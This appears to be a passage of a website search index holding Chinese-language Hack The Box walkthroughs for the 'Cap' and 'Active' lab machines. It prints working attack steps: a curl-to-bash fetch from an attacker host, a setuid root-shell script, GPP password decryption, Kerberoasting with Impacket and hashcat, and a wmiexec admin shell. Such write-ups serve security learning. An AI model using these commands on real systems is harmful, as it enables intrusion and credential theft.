/root/root.txt\n</code></pre>"},{"location":"HTB/Busqueda-DOC/#gitea","title":"\u4ec0\u4e48\u662f Gitea?","text":"<p>Gitea \u662f\u4e00\u4e2a\u81ea\u6258\u7ba1\u3001\u8f7b\u91cf\u7ea7\u3001\u5f00\u6e90\u7684 <code>Git</code> \u670d\u52a1\uff0c\u63d0\u4f9b\u7528\u4e8e\u7ba1\u7406 <code>Git</code> \u5b58\u50a8\u5e93\u7684 Web \u754c\u9762\u3002\u5b83\u662f\u4e00\u4e2a\u7248\u672c\u63a7\u5236\u670d\u52a1\u5668\uff0c\u7c7b\u4f3c\u4e8e <code>GitHub</code> \u6216 <code>GitLab</code> \u7b49\u6d41\u884c\u5e73\u53f0\uff0c\u4f46\u88ab\u8bbe\u8ba1\u4e3a\u8f7b\u91cf\u7ea7\u3001\u6613\u4e8e\u5b89\u88c5\u4e14\u6d88\u8017\u66f4\u5c11\u7684\u7cfb\u7edf\u8d44\u6e90\u3002</p>"},{"location":"HTB/Cap/","title":"CAP","text":"<p>Cap \u662f\u4e00\u4e2a\u8fd0\u884c HTTP \u670d\u52a1\u5668\u7684 Linux \u673a\u5668\uff0c\u56e0\u6b64\u5141\u8bb8\u7528\u6237\u6355\u83b7\u672a\u52a0\u5bc6\u7684\u6d41\u91cf\u3002\u4e0d\u5f53\u7684\u63a7\u5236\u4f1a\u5bfc\u81f4\u4e0d\u5b89\u5168\u7684\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528(IDOR)\uff0c\u5141\u8bb8\u8bbf\u95ee\u5176\u4ed6\u7528\u6237\u7684\u6355\u83b7\u3002\u6355\u83b7\u5305\u542b\u660e\u6587\u51ed\u636e\uff0c\u53ef\u7528\u4e8e\u83b7\u5f97\u7acb\u8db3\u70b9\u3002\u7136\u540e\u5229\u7528 Linux \u529f\u80fd\u83b7\u5f97 root\u3002</p>"},{"location":"HTB/Cap/#_1","title":"\u6240\u9700\u6280\u80fd","text":"<ul> <li>\u7f51\u9875\u679a\u4e3e</li> <li>\u6293\u5305\u5206\u6790</li> </ul>"},{"location":"HTB/Cap/#_2","title":"\u5b66\u5230\u7684\u6280\u80fd","text":"<ul> <li>\u200b IDOR</li> <li>\u5229\u7528 Linux \u529f\u80fd\u63d0\u6743</li> </ul>"},{"location":"HTB/Cap/#_3","title":"\u679a\u4e3e","text":""},{"location":"HTB/Cap/#nmap","title":"Nmap","text":"<pre><code>ports=$(nmap -p- --min-rate=1000 -Pn -T4 10.10.10.245 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//)\nnmap -p$ports -Pn -sC -sV 10.10.10.245\n</code></pre>"},{"location":"HTB/Cap/#ftp","title":"FTP","text":"<p>\u8ba9\u6211\u4eec\u68c0\u67e5 FTP \u662f\u5426\u5141\u8bb8\u533f\u540d\u8bbf\u95ee\u3002</p> <p></p> <p>\u767b\u5f55\u5931\u8d25\uff0c\u610f\u5473\u7740\u533f\u540d\u8bbf\u95ee\u88ab\u7981\u2f64\u3002\u8ba9\u6211\u4eec\u8f6c\u5230 HTTP \u670d\u52a1\u5668\u3002</p>"},{"location":"HTB/Cap/#http","title":"HTTP","text":"<p>\u6839\u636e nmap \u626b\u63cf\u7ed3\u679c\uff0c\u7aef\u2f1d 80 \u6b63\u5728\u8fd0\u2f8fGunicorn\uff0c\u8fd9\u662f\u2f00\u4e2a\u57fa\u4e8e python \u7684 HTTP \u670d\u52a1\u5668\u3002\u6d4f\u89c8\u5230\u2eda\u2faf . \u663e\u2f70\u2f00\u4e2a\u4eea\u8868\u677f\u3002</p> <p></p> <p>\u6d4f\u89c8\u5230IP \u914d\u7f6e\u2eda\u2faf\u4f1a\u663e\u2f70 <code>ifconfig</code>\u7684\u8f93\u51fa\u3002</p> <p></p> <p>\u540c\u6837\uff0c\u2f79\u7edc\u72b6\u6001\u2eda\u2faf\u663e\u2f70 <code>netstat</code> \u6267\u2f8f\u7cfb\u7edf\u547d\u4ee4\u7684\u8f93\u51fa\u3002\u5355\u51fb <code>Security Snapshot</code> \u83dc\u5355\u9879\u4f1a\u4f7f\u2eda \u8fd9\u610f\u5473\u7740\u5e94\u2f64\u7a0b\u5e8f\u662f \u2faf\u6682\u505c\u2f0f\u79d2\u949f\uff0c\u7136\u540e\u8fd4\u56de\u5982\u4e0b\u6240\u2f70\u7684\u2eda\u2faf\u3002</p> <p></p> <p>\u5355\u51fb\u4e0b\u8f7d\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u2f00\u4e2a\u6570\u636e\u5305\u6355\u83b7\uff0c\u53ef\u4ee5\u4f7f\u2f64 WireShark \u5bf9\u5176\u8fdb\u2f8f\u68c0\u67e5\u3002</p> <p></p> <p>\u6211\u4eec\u6ca1\u6709\u770b\u5230\u4efb\u4f55\u6709\u8da3\u7684\u4e1c\u897f\uff0c\u6355\u83b7\u7684\u6570\u636e\u53ea\u5305\u542b\u6765\u2f83\u6211\u4eec\u7684 HTTP \u6d41\u91cf\u3002</p>"},{"location":"HTB/Cap/#idor","title":"IDOR","text":"<p>\u9700\u8981\u6ce8\u610f\u7684\u4e00\u4ef6\u6709\u8da3\u7684\u4e8b\u60c5\u662f\u521b\u5efa\u65b0\u6355\u83b7\u65f6\u7684 URL \u65b9\u6848\uff0c\u5176\u5f62\u5f0f\u4e3a <code>/data/&lt;id&gt;</code> \u3002\u6bcf\u6b21\u6355\u83b7\u90fd\u4f1a\u589e\u52a0 id\u3002\u6709\u53ef\u80fd\u5728\u6211\u4eec\u4e4b\u524d\u6709\u6765\u81ea\u7528\u6237\u7684\u6570\u636e\u5305\u6355\u83b7\u3002</p> <p>\u6d4f\u89c8\u5230<code>/data/0</code> \u786e\u5b9e\u663e\u2f70\u4e86\u5305\u542b\u591a\u4e2a\u6570\u636e\u5305\u7684\u6570\u636e\u5305\u6355\u83b7</p> <p>\u6b64\u6f0f\u6d1e\u79f0\u4e3a\u4e0d\u5b89\u5168\u76f4\u63a5\u5bf9\u8c61\u5f15\u2f64 (IDOR)\uff0c\u5176\u4e2d\u2f00\u4e2a\u2f64\u2f3e\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u53e6\u2f00\u4e2a\u2f64\u2f3e\u62e5\u6709\u7684\u6570\u636e\u3002\u8ba9\u6211\u4eec\u68c0\u67e5\u6b64\u6355\u83b7\u4ee5\u67e5\u627e\u6f5c\u5728\u7684 \u654f\u611f\u6570\u636e\u3002</p>"},{"location":"HTB/Cap/#foothold","title":"Foothold","text":"<p>\u5728 Wireshark \u4e2d\u6253\u5f00\u5b83\u4f1a\u663e\u2f70\u2f64\u2f3e\u2f9d\u4efd\u9a8c\u8bc1\u7684 FTP \u6d41\u91cf\u3002</p> <p></p> <p>\u6d41\u91cf\u4e3a\u660e\u6587\uff0c\u5141\u8bb8\u6211\u4eec\u68c0\u7d22\u7528\u6237\u51ed\u636e\uff0c\u5373 <code>nathan / Buck3tH4TF0RM3!</code>  .\u8fd9\u4e9b\u88ab\u53d1\u73b0\u662f\u6709\u6548\u7684\uff0c\u53ef\u4ee5\u7528\u6765\u901a\u8fc7 SSH \u767b\u5f55\u3002</p> <p></p>"},{"location":"HTB/Cap/#privilege-escalation","title":"Privilege Escalation","text":"<p>\u8ba9\u6211\u4eec\u4f7f\u2f64 <code>linPEAS</code> \u68c0\u67e5\u7279\u6743\u5347\u7ea7\u5411\u91cf\u7684\u811a\u672c\u3002</p> <pre><code>curl http://10.10.14.24/linpeas.sh | bash\n</code></pre> <p></p> <p>\u53d1\u73b0\u8be5\u62a5\u544a\u5305\u542b\u4e00\u4e2a\u6709\u8da3\u7684\u6761\u76ee\uff0c\u7528\u4e8e\u5177\u6709\u529f\u80fd\u7684\u6587\u4ef6\u3002 <code>/usr/bin/python3.8</code> \u88ab\u53d1\u73b0\u6709 <code>cap_setuid</code> \u548c <code>cap_net_bind_service</code> \uff0c\u8fd9\u4e0d\u662f\u9ed8\u8ba4\u8bbe\u7f6e\u3002\u6839\u636e\u6587\u6863\uff0cCAP_SETUID \u5141\u8bb8\u8fdb\u7a0b\u5728\u6ca1\u6709\u8bbe\u7f6e SUID \u4f4d\u7684\u60c5\u51b5\u4e0b\u83b7\u5f97 setuid \u6743\u9650\u3002\u8fd9\u6709\u6548\u5730\u8ba9\u6211\u4eec\u5207\u6362\u5230 UID 0\uff0c\u5373 root\u3002</p> <pre><code>import os\nos.setuid(0)\nos.system(\"/bin/bash\")\n</code></pre> <p>\u4e0a\u9762\u7684\u811a\u672c\u53ef\u7528\u4e8e\u5207\u6362\u5230 root \u5e76\u751f\u6210\u4e00\u4e2a shell\u3002\u5b83\u8c03\u7528 os.setuid() \u7528\u4e8e\u4fee\u6539\u8fdb\u7a0b UID</p> <p></p>"},{"location":"HTB/HTB-Active/","title":"HTB Active","text":"<p>![[Pasted image 20221004114359.png]]</p>"},{"location":"HTB/HTB-Active/#synopsis","title":"SYNOPSIS","text":""},{"location":"HTB/HTB-Active/#skills-required","title":"Skills Required","text":"<ul> <li>Active Directory \u7684\u8eab\u4efd\u9a8c\u8bc1(authentication)\u548c\u5171\u4eab\u6587\u4ef6\u5939(shared folders)\u7684\u57fa\u672c\u77e5\u8bc6</li> </ul>"},{"location":"HTB/HTB-Active/#skills-learned","title":"Skills Learned","text":"<ul> <li>SMB \u679a\u4e3e\u6280\u672f</li> <li>\u7ec4\u7b56\u7565\u9996\u9009\u9879 Groups.xml \u679a\u4e3e\u548c\u5229\u7528</li> <li>\u8bc6\u522b\u548c\u5229\u7528 Kerberoastable \u5e10\u6237</li> </ul>"},{"location":"HTB/HTB-Active/#enumeration","title":"Enumeration","text":""},{"location":"HTB/HTB-Active/#_1","title":"\u7aef\u53e3\u626b\u63cf","text":"<pre><code>masscan -p1-65535 10.129.125.59 --rate=1000 -e tun0 &gt; ports\nports=$(cat ports | awk -F \" \" '{print $4}' | awk -F \"/\" '{print $1}' | sort -n | tr '\\n' ',' | sed 's/,$//')\n\nnmap -Pn -sV -sC -p$ports 10.129.125.59\n\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)\n| dns-nsid: \n|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-10-04 05:56:18Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds?\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5722/tcp  open  msrpc         Microsoft Windows RPC\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49152/tcp open  msrpc         Microsoft Windows RPC\n49153/tcp open  msrpc         Microsoft Windows RPC\n49154/tcp open  msrpc         Microsoft Windows RPC\n49155/tcp open  msrpc         Microsoft Windows RPC\n49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49158/tcp open  msrpc         Microsoft Windows RPC\n49165/tcp open  msrpc         Microsoft Windows RPC\n49170/tcp open  msrpc         Microsoft Windows RPC\n49172/tcp open  msrpc         Microsoft Windows RPC\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time: \n|   date: 2022-10-04T05:57:15\n|_  start_date: 2022-10-04T03:40:06\n| smb2-security-mode: \n|   2.1: \n|_    Message signing enabled and required\n\n\n</code></pre>"},{"location":"HTB/HTB-Active/#445","title":"\u679a\u4e3e445\u7aef\u53e3","text":"<pre><code>$ nmap --script safe -p445 10.129.125.59\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-10-04 07:14 BST\nPre-scan script results:\n|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/\n|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/\n|_broadcast-wpad-discover: Failed to retrieve wpad.dat (http://wpad.com/wpad.dat) from server\n| targets-asn: \n|_  targets-asn.asn is a mandatory parameter\nNmap scan report for active.htb (10.129.125.59)\nHost is up (0.0042s latency).\n\nPORT    STATE SERVICE\n445/tcp open  microsoft-ds\n|_smb-enum-services: ERROR: Script execution failed (use -d to debug)\n\nHost script results:\n| smb-mbenum: \n|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n|_clock-skew: 1s\n|_fcrdns: FAIL (No PTR record)\n|_msrpc-enum: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR\n| smb2-time: \n|   date: 2022-10-04T06:15:30\n|_  start_date: 2022-10-04T03:40:06\n| smb2-capabilities: \n|   2.0.2: \n|     Distributed File System\n|   2.1: \n|     Distributed File System\n|     Leasing\n|_    Multi-credit operations\n| dns-blacklist: \n|   SPAM\n|     l2.apews.org - FAIL\n|_    list.quorum.to - FAIL\n| unusual-port: \n|_  WARNING: this script depends on Nmap's service/version detection (-sV)\n| smb-protocols: \n|   dialects: \n|     2.0.2\n|_    2.1\n| port-states: \n|   tcp: \n|_    open: 445\n| smb2-security-mode: \n|   2.1: \n|_    Message signing enabled and required\n\nPost-scan script results:\n| reverse-index: \n|_  445/tcp: 10.129.125.59\n\n</code></pre>"},{"location":"HTB/HTB-Active/#smb","title":"\u679a\u4e3eSMB","text":"<pre><code>$ smbmap.py -H  -u NopSec -p 'NopSec1234!' -d widgetworld -F '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'\n\n\n$ smbclient -L //10.129.125.59\nEnter WORKGROUP\\htb-ovuln's password: \nAnonymous login successful\n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n    NETLOGON        Disk      Logon server share \n    Replication     Disk      \n    SYSVOL          Disk      Logon server share \n    Users           Disk      \nSMB1 disabled -- no workgroup available\n\n$ smbclient //$target/Replication\nEnter WORKGROUP\\htb-ovuln's password: \nAnonymous login successful\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; \nsmb: \\&gt; dir\n  .                                   D        0  Sat Jul 21 11:37:44 2018\n  ..                                  D        0  Sat Jul 21 11:37:44 2018\n  active.htb                          D        0  Sat Jul 21 11:37:44 2018\n\n        10459647 blocks of size 4096. 5203372 blocks available\n\n$ smb: \\&gt; RECURSE ON\nsmb: \\&gt; PROMPT OFF\nsmb: \\&gt; mget *\ngetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (2.5 KiloBytes/sec) (average 2.5 KiloBytes/sec)\ngetting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (2.7 KiloBytes/sec) (average 2.6 KiloBytes/sec)\ngetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (14.5 KiloBytes/sec) (average 6.4 KiloBytes/sec)\ngetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (340.3 KiloBytes/sec) (average 87.4 KiloBytes/sec)\ngetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (65.1 KiloBytes/sec) (average 83.0 KiloBytes/sec)\ngetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (107.2 KiloBytes/sec) (average 87.8 KiloBytes/sec)\ngetting file \\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (454.3 KiloBytes/sec) (average 137.5 KiloBytes/sec)\n\n</code></pre> <p>smbmap \u53ef\u4ee5 <code>Groups.xml</code> \u6587\u4ef6\u4e3a\u76ee\u6807</p> <pre><code>$ smbmap -R Replication -H 10.129.125.59 -A Groups.xml -q\n</code></pre> <p>mount \u66f4\u5f3a\u5927\u7684\u679a\u4e3e</p> <pre><code>sudo apt install cifs-utils\nmkdir /mnt/Replication\nmount -t cifs //10.129.125.59/Replication /mnt/Replication -o\nusername=&lt;username&gt;,password=&lt;password&gt;,domain=active.htb\ngrep -R password /mnt/Replication\n</code></pre> <p>SYSVOL\u526f\u672c \u5b58\u50a8\u7ec4\u7b56\u7565 \u63d0\u6743  \u63d0\u53d6Groups.xml --IppSec</p> <p>\u5c06 RECURSE \u8bbe\u7f6e\u4e3aON \u5c06 PROMPT \u8bbe\u7f6e\u4e3aOFF</p>"},{"location":"HTB/HTB-Active/#group-policy-preferences","title":"\u7ec4\u7b56\u7565\u9996\u9009\u9879(Group Policy Preferences)","text":"<p>Windows Server 2008 \u5f15\u5165\uff0c\u5141\u8bb8\u7ba1\u7406\u5458\u5728\u7f51\u7edc\u4e2d\u4fee\u6539\u7528\u6237\u548c\u7ec4 \u5229\u7528\u793a\u4f8b \u5f3a\u5bc6\u7801\u88abAES-256\u52a0\u5bc6\u5e76\u5b58\u50a8\u5728Groups.xml\u4e2d \uff1f(\u7ffb\u8bd1\u4e3a\u7406\u89e3)\u4f462012\u5e74\u5fae\u8f6f\u5728MSDN\u4e0a\u53d1\u5e03\u4e86AES\u5bc6\u94a5\uff0c\u610f\u5473\u7740\u4f7f\u7528GPP\u8bbe\u7f6e\u7684\u5bc6\u7801\u73b0\u5728\u5f88\u5bb9\u6613\u88ab\u7834\u89e3</p> <pre><code>$ cat Groups.xml \n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;\n&lt;/Groups&gt;\n\n$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\nGPPstillStandingStrong2k18\n</code></pre>"},{"location":"HTB/HTB-Active/#authenticated-enumeration","title":"Authenticated Enumeration","text":"<p>\u4f7f\u7528 active.htb \u57df\u7684\u6709\u6548\u51ed\u636e\uff0c\u53ef\u4ee5\u8fdb\u884c\u8fdb\u4e00\u6b65\u679a\u4e3e\u3002SYSVOL\u548cUsers \u5171\u4eab\u73b0\u5728\u53ef\u4ee5\u8bbf\u95ee <code>ldapsearch</code> \u53ef\u7528\u4e8e\u67e5\u8be2\u6d3b\u52a8\u8d26\u6237\u7684 Active Directory <code>UserAccountControl</code> \u5c5e\u6027\u7684\u57df\u63a7\u5236\u5668\uff0c\u4ee5\u53ca\u53ef\u80fd\u5e94\u7528\u4e8e\u5b83\u4eec\u7684\u5176\u4ed6\u7279\u5b9a\u914d\u7f6e\u3002\u8bb8\u591a <code>UserAccountControl</code> \u4e5f\u5177\u6709\u5b89\u5168\u76f8\u5173\u6027\u3002\u53ef\u80fd\u7684<code>UserAccountControl</code> \u503c <code>2</code> \u7684\u503c\u5bf9\u5e94\u4e8e\u7981\u7528\u7684\u8d26\u6237\u72b6\u6001\uff0c\u56e0\u6b64\u4e0b\u9762\u7684\u67e5\u8be2\u8fd4\u56de active.htb \u57df\u4e2d\u7684\u6d3b\u8dc3\u7528\u6237 (by sAMAccountName / username)</p> <pre><code>$ ldapsearch -x -h 10.129.241.119 -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b \"dc=active,dc=htb\" -s sub \"(&amp;(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))\" samaccountname | grep sAMAccountName\nsAMAccountName: Administrator\nsAMAccountName: SVC_TGS\n</code></pre> <p><code>Impacket</code> \u7684 <code>GetADUsers.py</code> \u7b80\u5316\u4e86\u679a\u4e3e\u57df\u7528\u6237\u8d26\u6237\u7684\u8fc7\u7a0b\u3002</p> <pre><code>$ GetADUsers.py -all active.htb/svc_tgs -dc-ip $target\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\n[*] Querying 10.129.241.119 for information about domain.\nName                  Email                           PasswordLastSet      LastLogon           \n--------------------  ------------------------------  -------------------  -------------------\nAdministrator                                         2018-07-18 20:06:40.351723  2022-10-07 04:16:04.670904 \nGuest                                                 &lt;never&gt;              &lt;never&gt;             \nkrbtgt                                                2018-07-18 19:50:36.972031  &lt;never&gt;             \nSVC_TGS                                               2018-07-18 21:14:38.402764  2022-10-07 06:05:45.308462\n</code></pre>"},{"location":"HTB/HTB-Active/#exploitation","title":"Exploitation","text":""},{"location":"HTB/HTB-Active/#kerberoasting","title":"Kerberoasting","text":"<p>Kerberos \u8eab\u4efd\u9a8c\u8bc1\u548c\u670d\u52a1\u4e3b\u4f53\u540d\u79f0 \"Kerberoasting\"\u7528\u4e8e\u5728 Active Directory \u57df\u4e2d\u4f5c\u6743\u9650\u63d0\u5347 \u4eceKerberos \"Ticket Granting Service\" \u7968\u8bc1\u56de\u590d(TGS_REP)\u4e2d\u63d0\u53d6\u52a0\u5bc6\u6750\u6599\u7684\u54c8\u5e0c\u503c\uff0c\u5bf9\u5176\u8fdb\u884c\u79bb\u7ebf\u7834\u89e3\u4ee5\u68c0\u7d22\u660e\u6587\u5bc6\u7801\u3002\u56e0\u4e3a <code>TGS_REP</code> \u7684\u670d\u52a1\u5b9e\u4f8b\u5728\u5176\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u7684\u8d26\u6237\u7684\u540d\u79f0\u4f7f\u7528\u7684\u662fNTLM \u52a0\u5bc6\u54c8\u5e0c\u7684\u3002 ![[Pasted image 20221007134730.png]]</p> <p>\u6258\u7ba1\u670d\u52a1\u8d26\u6237\u7531\u4e8e\u5bc6\u7801\u7684\u590d\u6742\u6027\u800c\u964d\u4f4e\u4e86\u8fd9\u79cd\u98ce\u9669\uff0c\u4f46\u4ed6\u4eec\u5728\u8bb8\u591a\u73af\u5883\u4e2d\u5e76\u672a\u79ef\u6781\u4f7f\u7528\u3002\u5173\u95ed\u670d\u52a1\u5668\u6258\u7ba1\u670d\u52a1\u5e76\u4e0d\u80fd\u7f13\u89e3\uff0c\u56e0\u4e3a\u653b\u51fb\u4e0d\u6d89\u53ca\u4e0e\u76ee\u6807\u7684\u901a\u4fe1\u670d\u52a1\u3002\u56e0\u6b64\uff0c\u5b9a\u671f\u5ba1\u6838\u6240\u6709\u8d26\u6237\u542f\u7528\u7684\u76ee\u7684\u548c\u6743\u9650\u975e\u5e38\u91cd\u8981\u3002 <code>Kerberos</code> \u8eab\u4efd\u9a8c\u8bc1\u4f7f\u7528\u670d\u52a1\u4e3b\u4f53\u540d\u79f0(SPN)\u6765\u8bc6\u522b\u4e0e\u7279\u5b9a\u670d\u52a1\u5b9e\u4f8b\u5173\u8054\u7684\u8d26\u6237\u3002<code>ldapsearch</code> \u53ef\u7528\u4e8e\u8bc6\u522b\u914d\u7f6e\u4e86SPN\u7684\u8d26\u6237\u3002</p> <pre><code>$ ldapsearch -x -h $target -p 389 -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b \"dc=active,dc=htb\" -s sub \"(&amp;(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))\" serviceprincipalname | grep -B 1 servicePrincipalName\ndn: CN=Administrator,CN=Users,DC=active,DC=htb\nservicePrincipalName: active/CIFS:445\n</code></pre> <p><code>active\\Administrator</code> \u4f3c\u4e4e\u5df2\u7ecf\u914d\u7f6e\u4e86 <code>SPN</code> <code>Impacket</code> \u7684 <code>GetUserSPNs.py</code> \u518d\u6b21\u7b80\u5316\u4e86\u6b64\u8fc7\u7a0b\uff0c\u8fd8\u80fd\u591f\u8bf7\u6c42 TGS \u5e76\u63d0\u53d6\u6563\u5217\u8fdb\u884c\u79bb\u7ebf\u7834\u89e3\u3002</p> <pre><code>$ GetUserSPNs.py active.htb/svc_tgs -dc-ip $target\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation \n--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2022-10-07 04:16:04.670904\n\n$ GetUserSPNs.py active.htb/svc_tgs -dc-ip $target -request\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\nPassword:\nServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation \n--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------\nactive/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2022-10-07 04:16:04.670904             \n\n$krb5tgs$23$*Adminis&lt;SNIP&gt;\n</code></pre>"},{"location":"HTB/HTB-Active/#cracking-of-kerberos-tgs-hash","title":"Cracking of Kerberos TGS Hash","text":"<p>\u4f7f\u7528 <code>hashcat</code> \u548c <code>john</code> \u5f88\u5bb9\u6613\u7834\u89e3 <code>active\\administrator</code> \u7684\u5bc6\u7801</p> <pre><code>$ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable\n\n&lt;SNIP&gt;ff9726:Ticketmaster1968\n\n$ john --format:krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt\nCreated directory: /home/htb-ovuln/.john\nUsing default input encoding: UTF-8\nLoaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nTicketmaster1968 (?)\n&lt;SNIP&gt;\n\n</code></pre>"},{"location":"HTB/HTB-Active/#primary-domain-admin-shell","title":"\u83b7\u53d6 Primary Domain Admin shell","text":"<p><code>Impacket</code> \u7684 <code>wmiexec.py</code> \u53ef\u4ee5\u83b7\u5f97 <code>active\\administrator</code> \u7684shell</p> <pre><code>$ wmiexec.py active/administrator:Ticketmaster1968@$target\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] SMBv2.1 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\nC:\\&gt;whoami\nactive\\administrator\nC:\\&gt;more C:\\Users\\administrator\\Desktop\\root.txt\n</code></pre>"},{"location":"HTB/HTB-Active/#bonus-the-old-school-kerberoasting-technique","title":"Bonus: The \"Old School(\u8001\u6d3e)\" Kerberoasting Technique(\u6280\u672f)","text":"<p>Windows \u548c Linux \u6709\u591a\u79cd kerberoasting \u65b9\u6cd5\uff0c\u4e0b\u9762\u590d\u5236\u4e86 Tim Medin \u7684\u539f\u59cb Kerberoasting \u6280\u672f\uff0c\u8be5\u6280\u672f\u5229\u7528 Benjamin Delpy \u7684 Mimikatz \u4e2d\u7684\u529f\u80fd\u6765\u5bfc\u51fa Kerberos \u7968\u8bc1\u3002</p> <p>\u57df\u8ba1\u7b97\u673a\u4e0a\u53ef\u4ee5\u4f7f\u7528\u5185\u7f6e\u5b9e\u7528\u7a0b\u5e8f setspn.exe \u679a\u4e3e\u53ef\u7528\u7684SPN\u548c\u5173\u8054\u8d26\u6237</p> <pre><code>&gt; whoami\navtive\\svc_tgs\n\n&gt; setspn -T active.htb -F -Q */*\n\n</code></pre> <p>\u8bf7\u6c42\u5e76\u4eceRAM</p> <p>SYSVOL Active Directory 